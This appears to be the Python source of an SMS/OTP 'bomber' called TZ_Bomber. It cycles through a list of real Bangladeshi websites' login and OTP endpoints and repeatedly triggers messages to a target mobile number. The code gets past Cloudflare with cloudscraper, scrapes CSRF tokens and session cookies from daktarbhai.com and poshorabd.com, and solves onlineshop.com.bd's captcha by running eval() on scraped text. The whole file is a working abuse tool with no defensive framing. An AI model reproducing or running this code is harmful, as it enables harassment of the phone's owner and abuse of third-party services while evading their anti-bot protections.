from json import dumps, loads, load
# from requests import get, post
from cloudscraper import CloudScraper
from random import choices
from bs4 import BeautifulSoup
from tldextract import extract
from string import ascii_letters
from threading import Thread
from re import findall
import urllib3

get, post = lambda *a, **b: CloudScraper().get(*a, **b), lambda *c, **d: CloudScraper().post(*c, **d)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_dakterbhai(mobile):
	resp=get('https://daktarbhai.com/')
	cookies=''
	headers={"Content-Type": "application/x-www-form-urlencoded"}
	for key, value in resp.cookies.items():
		cookies+=f'{key}={value}; '
	csrf_token=findall('name="csrf-token" content="(.*?)"', resp.text)[0]
	headers['X-CSRF-TOKEN'] = csrf_token
	headers['Cookie'] = cookies
	resp = post("https://daktarbhai.com/login/mobile", headers=headers, data="mobile=0"+str(mobile))
	if resp.status_code==200 and resp.text=='': return True
	else: return False

def get_onlineshop_bypass():
	r=get('https://onlineshop.com.bd/login')
	s=BeautifulSoup(r.text, 'html.parser')
	e=s.select_one('.fr_calculatdiv table tr td h4')
	j=eval(e.text.replace('=','').strip())
	sid=r.cookies.get('PHPSESSID')
	return sid, j

def get_poshra_bypass():
    r = get('https://poshorabd.com')
    XSRF = r.cookies.get('XSRF-TOKEN')
    SID = r.cookies.get('poshora_session')
    s = BeautifulSoup(r.text, 'html.parser')
    e = s.select_one('meta[name="csrf-token"]')
    CSRF = e.get('content')
    return XSRF, SID, CSRF

def debug_write(domain, identifier, text, preback):
	debug=open('debug.json', 'r')
	data=load(debug)
	debug.close()
	debug=open('debug.json', 'w')
	data.append({'domain':domain, 'identifier': identifier,'text': text,'preback': preback})
	debug.write(dumps(data, indent=4))
	debug.close()

def get_random(length=10):
	return "".join(choices(ascii_letters, k=length))

def get_domain(url):
	e = extract(url)
	if e.subdomain:
		return f'{e.subdomain}.{e.domain}.{e.suffix}'
	else:
		return f'{e.domain}.{e.suffix}'

def send_request(info:dict, mobile:int=None):
	url=info["url"]
	if 'daktarbhai' in url:
		try:
			return send_dakterbhai(mobile)
		except:
			return False
	method=info["method"]
	data=info["data"]
	headers=info["headers"]
	identifier=info["identifier"]
	preback=info.get("preback")
	if method.lower()=="get":
		engine=get
	elif method.lower()=="post":
		engine=post
	else:
		print("Method Error:", get_domain(url))
		engine=post
	try:
		resp=engine(url, data=data, headers=headers, timeout=20)
	except KeyboardInterrupt:
		exit()
	except:
		# debug_write(get_domain(url), identifier, 'Try except', False)
		return False
	if identifier in resp.text:
		return True
	else:
		if preback:
			url=preback["url"]
			method=preback["method"]
			data=preback["data"]
			headers=preback["headers"]
			identifier=preback["identifier"]
			if method.lower()=="get":
				engine=get
			elif method.lower()=="post":
				engine=post
			else:
				print("Method Error:", get_domain(url))
				engine=post
			try:
				resp=engine(url, data=data, headers=headers, timeout=20)
			except KeyboardInterrupt:
				exit()
			except:
				# debug_write(get_domain(url), identifier, 'Try except', True)
				return False
			if identifier in resp.text:
				return True
			else:
				# debug_write(get_domain(url), identifier, resp.text, True)
				return False
		else:
			# debug_write(get_domain(url), identifier, resp.text, False)
			return False

def get_api(unlimited=False):
	all_api=loads(open("all_api.json").read())
	un_api=[]
	if unlimited:
		for api in all_api:
			if api["unlimited"]:
				un_api.append(api)
		return un_api
	return all_api

def prepare_api(api, mobile):
	api=dumps(api)
	api=api.replace("{MOBILE_NO}", mobile)
	api=api.replace("{RANDOM}", get_random())
	
	if api.__contains__('{ONLINE_SHOP_SUM}') and api.__contains__('{ONLINE_SHOP_SID}'):
		sid, captcha_sum = get_onlineshop_bypass()
		api=api.replace('{ONLINE_SHOP_SUM}', str(captcha_sum)).replace('{ONLINE_SHOP_SID}', sid)
	
	if api.__contains__('{POSHRA_CSRF}') and api.__contains__('{POSHRA_XSRF}') and api.__contains__('{POSHRA_SID}'):
		XSRF, SID, CSRF = get_poshra_bypass()
		api=api.replace('{POSHRA_XSRF}',XSRF).replace('{POSHRA_SID}', SID).replace('{POSHRA_CSRF}', CSRF)

	api=loads(api)
	return api

def calc_percent(minimum, maximum, current):
	return float("{:.1f}".format((((current - minimum) * 100) / (maximum - minimum))))

class TZ_Bomber:
	def __init__(self, mobile, amount, unlimited=False):
		self.mobile=str(mobile)
		self.amount=amount
		self.unlimited=unlimited
		self.i=0
		self.attempt=0
		self.sent=0
		self.failed=0
		self.run=False
		self.completed=False
		self.all_api=get_api(self.unlimited)
		# print(len(self.all_api))

	@property
	def progress(self):
		return calc_percent(0, self.amount, self.sent)

	@property
	def remaining(self):
		return self.amount - self.sent
		
	def _bomb(self):
		while self.run:
			api=self.all_api[self.i]
			api=prepare_api(api, self.mobile)
			request=send_request(api, self.mobile)
			self.attempt+=1
			if request:
				self.sent+=1
			else:
				self.failed+=1
			try:
				self.i+=1
				self.all_api[self.i]
			except:
				self.i=0
			if self.amount<=self.sent:
				self.run=False
				self.completed=True
				
	def start(self):
		self.run=True
		t=Thread(target=self._bomb)
		t.setDaemon(True)
		t.start()
		
	def stop(self):
		self.run=False

